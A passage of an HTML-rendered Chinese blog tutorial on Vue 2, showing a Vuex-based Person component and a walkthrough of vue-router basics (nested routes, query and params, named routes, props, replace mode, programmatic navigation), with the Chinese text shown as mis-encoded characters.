class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;h1&gt;äººå‘˜åˆ—è¡¨&lt;/h1&gt;<br>        &lt;h3 style=&quot;color:red&quot;&gt;Countç»„ä»¶æ±‚å’Œä¸ºï¼š&#123;&#123; sum &#125;&#125;&lt;/h3&gt;<br>        &lt;h3&gt;åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªäººçš„åå­—æ˜¯ï¼š&#123;&#123; firstPersonName &#125;&#125;&lt;/h3&gt;<br>        &lt;input type=&quot;text&quot; placeholder=&quot;è¯·è¾“å…¥åå­—&quot; v-model=&quot;name&quot;&gt;<br>        &lt;button @click=&quot;add&quot;&gt;æ·»åŠ &lt;/button&gt;<br>        &lt;button @click=&quot;addWang&quot;&gt;æ·»åŠ ä¸€ä¸ªå§“ç‹çš„äºº&lt;/button&gt;<br>        &lt;button @click=&quot;addPerson&quot;&gt;éšæœºæ·»åŠ ä¸€ä¸ªäºº&lt;/button&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for=&quot;p in personList&quot; :key=&quot;p.id&quot;&gt;&#123;&#123; p.name &#125;&#125;&lt;/li&gt;<br>        &lt;/ul&gt;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    import &#123;<br>        nanoid<br>    &#125; from &#x27;nanoid&#x27;<br>    export default &#123;<br>        name: &#x27;Person&#x27;,<br>        data() &#123;<br>            return &#123;<br>                name: &#x27;&#x27;<br>            &#125;<br>        &#125;,<br>        computed: &#123;<br>            personList() &#123;<br>                return this.$store.state.personAbout.personList<br>            &#125;,<br>            sum() &#123;<br>                return this.$store.state.countAbout.sum<br>            &#125;,<br>            firstPersonName() &#123;<br>                return this.$store.getters[&#x27;personAbout/firstPersonName&#x27;]<br>            &#125;<br>        &#125;,<br>        methods: &#123;<br>            add() &#123;<br>                const personObj = &#123;<br>                    id: nanoid(),<br>                    name: this.name<br>                &#125;<br>                this.$store.commit(&#x27;personAbout/ADD_PERSON&#x27;, personObj)<br>                this.name = &#x27;&#x27;<br>            &#125;,<br>            addWang() &#123;<br>                const personObj = &#123;<br>                    id: nanoid(),<br>                    name: this.name<br>                &#125;<br>                this.$store.dispatch(&#x27;personAbout/addPersonWang&#x27;, personObj)<br>                this.name = &#x27;&#x27;<br>            &#125;,<br>            addPerson() &#123;<br>                this.$store.dispatch(&#x27;personAbout/addPersonServer&#x27;)<br>            &#125;<br>        &#125;,<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>â€‹    </p><h1 id="4-è·¯ç”±"><a href="#4-è·¯ç”±" class="headerlink" title="4. è·¯ç”±"></a>4. è·¯ç”±</h1><p><strong>ç›¸å…³ç†è§£</strong></p><ol><li>vue-router çš„ç†è§£</li></ol><ul><li><p>vueçš„ä¸€ä¸ªæ’ä»¶åº“ï¼Œä¸“é—¨ç”¨æ¥å®ç°SPAåº”ç”¨</p><ol start="2"><li>å¯¹SPAåº”ç”¨çš„ç†è§£</li></ol></li><li><p>å•é¡µWebåº”ç”¨ï¼ˆsingle page web applicationï¼ŒSPAï¼‰</p></li><li><p>æ•´ä¸ªåº”ç”¨åªæœ‰ä¸€ä¸ªå®Œæ•´çš„é¡µé¢</p></li><li><p>ç‚¹å‡»é¡µé¢ä¸­çš„å¯¼èˆªé“¾æ¥ä¸ä¼šåˆ·æ–°é¡µé¢ï¼Œåªä¼šåšé¡µé¢çš„å±€éƒ¨æ›´æ–°</p></li><li><p>æ•°æ®éœ€è¦é€šè¿‡ajaxè¯·æ±‚è·å–</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221118221726021.png" alt="image-20221118221726021"></p></li></ul><p><strong>è·¯ç”±çš„ç†è§£</strong></p><ol><li><p>ä»€ä¹ˆæ˜¯è·¯ç”±? </p><ul><li>ä¸€ä¸ªè·¯ç”±å°±æ˜¯ä¸€ç»„æ˜ å°„å…³ç³»ï¼ˆkey - valueï¼‰</li><li>keyä¸ºè·¯å¾„ï¼Œvalueå¯èƒ½æ˜¯functionæˆ–componen</li></ul></li><li><p>è·¯ç”±åˆ†ç±»</p><ul><li>åç«¯è·¯ç”±<ol><li>ç†è§£ï¼švalueæ˜¯functionï¼Œç”¨äºå¤„ç†å®¢æˆ·ç«¯æäº¤çš„è¯·æ±‚</li><li>å·¥ä½œè¿‡ç¨‹ï¼šæœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œæ ¹æ®è¯·æ±‚è·¯å¾„æ‰¾åˆ°åŒ¹é…çš„å‡½æ•°æ¥å¤„ç†è¯·æ±‚ï¼Œè¿”å›å“åº”æ•°æ®</li></ol></li><li>å‰ç«¯è·¯ç”±<ol><li>ç†è§£ï¼švalueæ˜¯componentï¼Œç”¨äºå±•ç¤ºé¡µé¢å†…å®¹</li><li>å·¥ä½œè¿‡ç¨‹ï¼šå½“æµè§ˆå™¨çš„è·¯å¾„æ”¹å˜æ—¶ï¼Œå¯¹åº”çš„ç»„ä»¶å°±ä¼šæ˜¾ç¤º</li></ol></li></ul></li></ol><h2 id="4-1-åŸºæœ¬ä½¿ç”¨"><a href="#4-1-åŸºæœ¬ä½¿ç”¨" class="headerlink" title="4.1 åŸºæœ¬ä½¿ç”¨"></a>4.1 åŸºæœ¬ä½¿ç”¨</h2><ol><li><p>å®‰è£…vue-routerï¼Œå‘½ä»¤ï¼š<code>npm i vue-router</code></p><p>ç‰ˆæœ¬é—®é¢˜ Vue2ç‰ˆæœ¬ä½¿ç”¨ <code>npm i vue-router@3</code></p></li><li><p>åº”ç”¨æ’ä»¶ï¼š<code>Vue.use(VueRouter)</code></p></li><li><p>ç¼–å†™routeré…ç½®é¡¹:</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//å¼•å…¥VueRouter</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">VueRouter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-comment">//å¼•å…¥Luyou ç»„ä»¶</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/About&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/Home&#x27;</span><br><br><span class="hljs-comment">//åˆ›å»ºrouterå®ä¾‹å¯¹è±¡ï¼Œå»ç®¡ç†ä¸€ç»„ä¸€ç»„çš„è·¯ç”±è§„åˆ™</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>(&#123;<br><span class="hljs-attr">routes</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/about&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">About</span><br>&#125;,<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/home&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Home</span><br>&#125;<br>]<br>&#125;)<br><br><span class="hljs-comment">//æš´éœ²router</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router<br></code></pre></td></tr></table></figure><ol start="4"><li><p>å®ç°åˆ‡æ¢ï¼ˆactive-classå¯é…ç½®é«˜äº®æ ·å¼ï¼‰</p><p><code>&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;</code></p></li><li><p>æŒ‡å®šå±•ç¤ºä½ç½®</p><p><code>&lt;router-view&gt;&lt;/router-view&gt;</code></p></li></ol><h2 id="4-2-å‡ ä¸ªæ³¨æ„ç‚¹"><a href="#4-2-å‡ ä¸ªæ³¨æ„ç‚¹" class="headerlink" title="4.2 å‡ ä¸ªæ³¨æ„ç‚¹"></a>4.2 å‡ ä¸ªæ³¨æ„ç‚¹</h2><ol><li><p>è·¯ç”±ç»„ä»¶é€šå¸¸å­˜æ”¾åœ¨<code>pages</code>æ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬ç»„ä»¶é€šå¸¸å­˜æ”¾åœ¨<code>components</code>æ–‡ä»¶å¤¹ã€‚</p><p>æ¯”å¦‚ä¸Šä¸€èŠ‚çš„æ¡ˆä¾‹å°±å¯ä»¥ä¿®æ”¹ä¸º </p><p>src&#x2F;pages&#x2F;Home.vue </p><p>src&#x2F;pages&#x2F;About.vue </p><p>src&#x2F;router&#x2F;index.js</p><p>src&#x2F;components&#x2F;Banner.vue </p><p>src&#x2F;App.vue</p></li><li><p>é€šè¿‡åˆ‡æ¢ï¼Œâ€œéšè—â€äº†çš„è·¯ç”±ç»„ä»¶ï¼Œé»˜è®¤æ˜¯è¢«é”€æ¯æ‰çš„ï¼Œéœ€è¦çš„æ—¶å€™å†å»æŒ‚è½½ã€‚</p></li><li><p>æ¯ä¸ªç»„ä»¶éƒ½æœ‰è‡ªå·±çš„<code>$route</code>å±æ€§ï¼Œé‡Œé¢å­˜å‚¨ç€è‡ªå·±çš„è·¯ç”±ä¿¡æ¯ã€‚</p></li><li><p>æ•´ä¸ªåº”ç”¨åªæœ‰ä¸€ä¸ªrouterï¼Œå¯ä»¥é€šè¿‡ç»„ä»¶çš„<code>$router</code>å±æ€§è·å–åˆ°ã€‚</p></li></ol><h2 id="4-3-å¤šçº§è·¯ç”±ï¼ˆå¤šçº§è·¯ç”±ï¼‰"><a href="#4-3-å¤šçº§è·¯ç”±ï¼ˆå¤šçº§è·¯ç”±ï¼‰" class="headerlink" title="4.3 å¤šçº§è·¯ç”±ï¼ˆå¤šçº§è·¯ç”±ï¼‰"></a>4.3 å¤šçº§è·¯ç”±ï¼ˆå¤šçº§è·¯ç”±ï¼‰</h2><pre><code class="hljs">1. é…ç½®è·¯ç”±è§„åˆ™ï¼Œä½¿ç”¨**children**é…ç½®é¡¹ï¼š</code></pre><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">routes</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/about&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">About</span>,<br>&#125;,<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/home&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Home</span>,<br><span class="hljs-attr">children</span>:[ <span class="hljs-comment">//é€šè¿‡childrené…ç½®å­çº§è·¯ç”±</span><br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;news&#x27;</span>, <span class="hljs-comment">//æ­¤å¤„ä¸€å®šä¸è¦å†™ï¼š/news</span><br><span class="hljs-attr">component</span>:<span class="hljs-title class_">News</span><br>&#125;,<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;message&#x27;</span>,<span class="hljs-comment">//æ­¤å¤„ä¸€å®šä¸è¦å†™ï¼š/message</span><br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Message</span><br>&#125;<br>]<br>&#125;<br>]<br><br></code></pre></td></tr></table></figure><ol start="2"><li><p>è·³è½¬ï¼ˆè¦å†™å®Œæ•´è·¯å¾„ï¼‰ï¼š</p><p><code>&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;</code></p></li><li><p>æŒ‡å®šå±•ç¤ºä½ç½®</p><p><code>&lt;router-view&gt;&lt;/router-view&gt;</code></p></li></ol><h2 id="4-4-è·¯ç”±çš„queryå‚æ•°"><a href="#4-4-è·¯ç”±çš„queryå‚æ•°" class="headerlink" title="4.4 è·¯ç”±çš„queryå‚æ•°"></a>4.4 è·¯ç”±çš„queryå‚æ•°</h2><ol><li>ä¼ é€’å‚æ•°</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!-- è·³è½¬å¹¶æºå¸¦queryå‚æ•°ï¼Œtoçš„å­—ç¬¦ä¸²å†™æ³• --&gt;<br>&lt;router-link :to=&quot;/home/message/detail?id=666&amp;title=ä½ å¥½&quot;&gt;è·³è½¬&lt;/router-link&gt;<br><br>&lt;!-- è·³è½¬å¹¶æºå¸¦queryå‚æ•°ï¼Œtoçš„å¯¹è±¡å†™æ³• --&gt;<br>&lt;router-link <br>:to=&quot;&#123;<br>path:&#x27;/home/message/detail&#x27;,<br>query:&#123;<br>   id:666,<br>            title:&#x27;ä½ å¥½&#x27;<br>&#125;<br>&#125;&quot;<br>&gt;è·³è½¬&lt;/router-link&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ¥æ”¶å‚æ•°ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span><br>$route.<span class="hljs-property">query</span>.<span class="hljs-property">title</span><br></code></pre></td></tr></table></figure><h2 id="4-5-å‘½åè·¯ç”±"><a href="#4-5-å‘½åè·¯ç”±" class="headerlink" title="4.5 å‘½åè·¯ç”±"></a>4.5 å‘½åè·¯ç”±</h2><ol><li><p>ä½œç”¨ï¼šå¯ä»¥ç®€åŒ–è·¯ç”±çš„è·³è½¬ã€‚</p></li><li><p>å¦‚ä½•ä½¿ç”¨</p><ol><li><p>ç»™è·¯ç”±å‘½åï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/demo&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Demo</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;test&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Test</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br>           <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-comment">// ç»™è·¯ç”±å‘½å</span><br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;welcome&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Hello</span>,<br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç®€åŒ–è·³è½¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vue"> &lt;!--ç®€åŒ–å‰ï¼Œéœ€è¦å†™å®Œæ•´çš„è·¯å¾„ --&gt;<br>&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;è·³è½¬&lt;/router-link&gt;<br><br>&lt;!--ç®€åŒ–åï¼Œç›´æ¥é€šè¿‡åå­—è·³è½¬ --&gt;<br>&lt;router-link :to=&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;&gt;è·³è½¬&lt;/router-link&gt;<br><br>&lt;!--ç®€åŒ–å†™æ³•é…åˆä¼ é€’å‚æ•° --&gt;<br>&lt;router-link <br>:to=&quot;&#123;<br>name:&#x27;hello&#x27;,<br>query:&#123;<br>     id:666,<br>         title:&#x27;ä½ å¥½&#x27;<br>&#125;<br>&#125;&quot;<br>&gt;è·³è½¬&lt;/router-link&gt;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="4-6-è·¯ç”±çš„paramså‚æ•°"><a href="#4-6-è·¯ç”±çš„paramså‚æ•°" class="headerlink" title="4.6 è·¯ç”±çš„paramså‚æ•°"></a>4.6 è·¯ç”±çš„paramså‚æ•°</h2><ol><li><p>é…ç½®è·¯ç”±ï¼Œå£°æ˜æ¥æ”¶<strong>params</strong>å‚æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/home&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Home</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;news&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">News</span><br>&#125;,<br>&#123;<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Message</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;detail/:id/:title&#x27;</span>, <span class="hljs-comment">// ğŸ”´ä½¿ç”¨å ä½ç¬¦å£°æ˜æ¥æ”¶paramså‚æ•°</span><br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Detail</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ä¼ é€’å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!-- è·³è½¬å¹¶æºå¸¦paramså‚æ•°ï¼Œtoçš„å­—ç¬¦ä¸²å†™æ³• --&gt;<br>&lt;router-link :to=&quot;/home/message/detail/666/ä½ å¥½&quot;&gt;è·³è½¬&lt;/router-link&gt;<br><br>&lt;!-- è·³è½¬å¹¶æºå¸¦paramså‚æ•°ï¼Œtoçš„å¯¹è±¡å†™æ³• --&gt;<br>&lt;router-link <br>:to=&quot;&#123;<br>name:&#x27;xiangqing&#x27;,<br>params:&#123;<br>    id:666,<br>       title:&#x27;ä½ å¥½&#x27;<br>&#125;<br>&#125;&quot;<br>&gt;è·³è½¬&lt;/router-link&gt;<br></code></pre></td></tr></table></figure><blockquote><p>ç‰¹åˆ«æ³¨æ„ï¼šè·¯ç”±æºå¸¦paramså‚æ•°æ—¶ï¼Œè‹¥ä½¿ç”¨toçš„å¯¹è±¡å†™æ³•ï¼Œåˆ™ä¸èƒ½ä½¿ç”¨pathé…ç½®é¡¹ï¼Œå¿…é¡»ä½¿ç”¨nameé…ç½®ï¼</p></blockquote></li><li><p>æ¥æ”¶å‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span><br>$route.<span class="hljs-property">params</span>.<span class="hljs-property">title</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="4-7-è·¯ç”±çš„propsé…ç½®"><a href="#4-7-è·¯ç”±çš„propsé…ç½®" class="headerlink" title="4.7 è·¯ç”±çš„propsé…ç½®"></a>4.7 è·¯ç”±çš„propsé…ç½®</h2><p>ä½œç”¨ï¼šè®©è·¯ç”±ç»„ä»¶æ›´æ–¹ä¾¿çš„æ”¶åˆ°å‚æ•°</p>   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;detail/:id&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Detail</span>,<br><br><span class="hljs-comment">//ç¬¬ä¸€ç§å†™æ³•ï¼špropså€¼ä¸ºå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸­æ‰€æœ‰çš„key-valueçš„ç»„åˆæœ€ç»ˆéƒ½ä¼šé€šè¿‡propsä¼ ç»™Detailç»„ä»¶</span><br><span class="hljs-comment">// props:&#123;a:900&#125;</span><br><br><span class="hljs-comment">//ç¬¬äºŒç§å†™æ³•ï¼špropså€¼ä¸ºå¸ƒå°”å€¼ï¼Œä¸ºtrueæ—¶ï¼Œåˆ™æŠŠè·¯ç”±æ”¶åˆ°çš„æ‰€æœ‰paramså‚æ•°é€šè¿‡propsä¼ ç»™Detailç»„ä»¶</span><br><span class="hljs-comment">// props:true</span><br><br><span class="hljs-comment">//ç¬¬ä¸‰ç§å†™æ³•ï¼špropså€¼ä¸ºå‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›çš„å¯¹è±¡ä¸­æ¯ä¸€ç»„key-valueéƒ½ä¼šé€šè¿‡propsä¼ ç»™Detailç»„ä»¶</span><br><span class="hljs-title function_">props</span>(<span class="hljs-params">$route</span>)&#123; <span class="hljs-comment">// è¿™é‡Œå¯ä»¥ä½¿ç”¨è§£æ„èµ‹å€¼ &#123;query&#125;</span><br><span class="hljs-keyword">return</span> &#123;<br><span class="hljs-attr">id</span>: $route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>,<br><span class="hljs-attr">title</span>: $route.<span class="hljs-property">query</span>.<span class="hljs-property">title</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ–¹ä¾¿åœ¨è¦è·³è½¬å»çš„ç»„ä»¶é‡Œæ›´ç®€ä¾¿çš„å†™æ³•</p></blockquote><p>è·³è½¬å»ç»„ä»¶çš„å…·ä½“ä»£ç </p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;ul&gt;<br>      &lt;h1&gt;Detail&lt;/h1&gt;<br>      &lt;li&gt;æ¶ˆæ¯ç¼–å·ï¼š&#123;&#123;id&#125;&#125;&lt;/li&gt;<br>      &lt;li&gt;æ¶ˆæ¯æ ‡é¢˜ï¼š&#123;&#123;title&#125;&#125;&lt;/li&gt;<br>      &lt;li&gt;a:&#123;&#123;a&#125;&#125;&lt;/li&gt;<br>      &lt;li&gt;b:&#123;&#123;b&#125;&#125;&lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>    name: &#x27;Detail&#x27;,<br>    props: [&#x27;id&#x27;, &#x27;title&#x27;, &#x27;a&#x27;, &#x27;b&#x27;],<br>    mounted () &#123;<br>        console.log(this.$route);<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br><br></code></pre></td></tr></table></figure><h2 id="4-8-lt-router-link-gt-çš„replaceå±æ€§"><a href="#4-8-lt-router-link-gt-çš„replaceå±æ€§" class="headerlink" title="4.8 &lt;router-link&gt;çš„replaceå±æ€§"></a>4.8 <code>&lt;router-link&gt;</code>çš„replaceå±æ€§</h2><ol><li><p>ä½œç”¨ï¼šæ§åˆ¶è·¯ç”±è·³è½¬æ—¶æ“ä½œæµè§ˆå™¨å†å²è®°å½•çš„æ¨¡å¼</p></li><li><p>æµè§ˆå™¨çš„å†å²è®°å½•æœ‰ä¸¤ç§å†™å…¥æ–¹å¼ï¼šåˆ†åˆ«ä¸º<code>push</code>å’Œ<code>replace</code></p><p><code>push</code>æ˜¯è¿½åŠ å†å²è®°å½•</p><p><code>replace</code>æ˜¯æ›¿æ¢å½“å‰è®°å½•ã€‚è·¯ç”±è·³è½¬æ—¶å€™é»˜è®¤ä¸º<code>push</code></p></li><li><p>å¦‚ä½•å¼€å¯<code>replace</code>æ¨¡å¼ï¼š</p><p><code>&lt;router-link :replace=&quot;true&quot; ...&gt;News&lt;/router-link&gt;</code><br>ç®€å†™<code>&lt;router-link replace ...&gt;News&lt;/router-link&gt;</code></p></li></ol><h2 id="4-9-ç¼–ç¨‹å¼è·¯ç”±å¯¼èˆª"><a href="#4-9-ç¼–ç¨‹å¼è·¯ç”±å¯¼èˆª" class="headerlink" title="4.9 ç¼–ç¨‹å¼è·¯ç”±å¯¼èˆª"></a>4.9 ç¼–ç¨‹å¼è·¯ç”±å¯¼èˆª</h2><pre><code class="hljs">1. ä½œç”¨ï¼šä¸å€ŸåŠ©`&lt;router-link&gt; `å®ç°è·¯ç”±è·³è½¬ï¼Œè®©è·¯ç”±è·³è½¬æ›´åŠ çµæ´»</code></pre><ol start="2"><li><p>this.$router.push({})å†…ä¼ çš„å¯¹è±¡ä¸<code>&lt;router-link&gt;</code>ä¸­çš„<strong>to</strong>ç›¸åŒ</p><p>this.$router.replace({})</p><p>this.$router.forward()å‰è¿›</p></li></ol><p>â€‹      this.$router.back()åé€€</p><p>â€‹      this.$router.go(n)å¯å‰è¿›ä¹Ÿå¯åé€€ï¼Œnä¸ºæ­£æ•°å‰è¿›nï¼Œä¸ºè´Ÿæ•°åé€€</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//$routerçš„ä¸¤ä¸ªAPI</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>(&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">params</span>:&#123;<br><span class="hljs-attr">id</span>:xxx,<br><span 